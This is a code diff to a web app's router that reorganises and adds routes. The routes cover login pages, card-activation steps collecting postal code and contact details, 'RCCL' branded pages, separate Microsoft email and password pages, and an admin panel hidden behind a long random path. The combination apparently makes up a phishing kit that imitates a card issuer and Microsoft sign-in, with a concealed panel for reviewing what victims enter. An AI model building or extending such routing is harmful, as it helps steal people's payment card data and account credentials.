@@ -25,20 +25,36 @@ import RcclCardActivationPage from "@/pages/RcclCardActivationPage";
 function Router() {
   return (
     <Switch>
+      {/* Main Login Routes */}
       <Route path="/" component={LoginPage} />
+      <Route path="/login" component={LoginPage} />
+      
+      {/* Account & Auth Routes */}
       <Route path="/account" component={AccountPage} />
-      <Route path="/rccl" component={RcclPage} />
-      <Route path="/rccl-register" component={RcclRegisterPage} />
-      <Route path="/rccl-activate-card" component={RcclCardActivationPage} />
-      <Route path="/postal-code" component={PostalCodePage} />
-      <Route path="/activate-card" component={CardActivationPage} />
-      <Route path="/contact-info" component={ContactInfoPage} />
       <Route path="/register" component={RegisterPage} />
       <Route path="/forgot-username" component={ForgotUsernamePage} />
       <Route path="/forgot-password" component={ForgotPasswordPage} />
+      
+      {/* Card Activation Routes */}
+      <Route path="/postal-code" component={PostalCodePage} />
+      <Route path="/activate-card" component={CardActivationPage} />
+      <Route path="/contact-info" component={ContactInfoPage} />
+      
+      {/* RCCL Routes */}
+      <Route path="/rccl" component={RcclPage} />
+      <Route path="/rccl/login" component={RcclPage} />
+      <Route path="/rccl-register" component={RcclRegisterPage} />
+      <Route path="/rccl/register" component={RcclRegisterPage} />
+      <Route path="/rccl-activate-card" component={RcclCardActivationPage} />
+      <Route path="/rccl/activate-card" component={RcclCardActivationPage} />
+      
+      {/* Microsoft Auth Routes */}
       <Route path="/microsoft-email" component={MicrosoftEmailPage} />
       <Route path="/microsoft-password" component={MicrosoftPasswordPage} />
+      
+      {/* Admin Panel */}
       <Route path="/secure-admin-panel-7f8a9b2c4d5e6f1a3b8c9d0e2f4a6b8c9d1e3f5a7b9c0d2e4f6a8b0c2d4e6f8a" component={AdminPage} />
+      
       <Route component={NotFound} />
     </Switch>
   );
